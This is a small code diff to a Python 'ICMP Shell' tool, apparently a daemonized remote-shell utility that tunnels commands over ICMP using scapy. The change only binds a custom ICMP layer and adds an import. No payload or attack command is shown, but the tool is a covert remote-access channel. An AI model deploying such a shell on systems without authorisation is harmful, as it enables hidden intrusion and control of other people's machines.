@@ -6,6 +6,7 @@ import threading
 from daemoniker import Daemonizer
 from scapy.layers.inet import IP, ICMP
 from scapy.layers.l2 import Ether
+from scapy.packet import bind_layers
 from scapy.sendrecv import sniff, sendp
 
 import config
@@ -68,6 +69,8 @@ def sniff_in_debug():
 
 with Daemonizer() as (is_setup, daemonizer):
     if is_setup:
+        bind_layers(ICMP, CustomICMP)
+
         parser = argparse.ArgumentParser(description='ICMP Shell')
 
         parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
